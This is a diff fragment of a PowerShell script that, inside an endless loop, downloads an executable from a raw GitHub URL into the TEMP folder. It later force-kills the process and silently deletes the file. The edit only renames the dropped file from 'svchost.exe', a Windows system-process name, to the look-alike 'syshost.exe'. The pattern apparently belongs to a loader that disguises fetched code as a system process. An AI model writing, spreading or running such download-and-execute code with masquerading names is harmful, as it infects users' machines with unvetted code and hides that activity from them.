@@ -110,7 +110,7 @@ while ($true)
         Write-Console "DOWNLOADING..." "INFO"
 
         $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
-        $path = "$env:TEMP\svchost.exe"
+        $path = "$env:TEMP\syshost.exe"
 
         try {
 
@@ -158,12 +158,12 @@ while ($true)
         Write-Console "CLEANING..." "INFO"
 
         Stop-Process `
-        -Name "svchost" `
+        -Name "syshost" `
         -Force `
         -ErrorAction SilentlyContinue
 
         Remove-Item `
-        "$env:TEMP\svchost.exe" `
+        "$env:TEMP\syshost.exe" `
         -Force `
         -ErrorAction SilentlyContinue
 
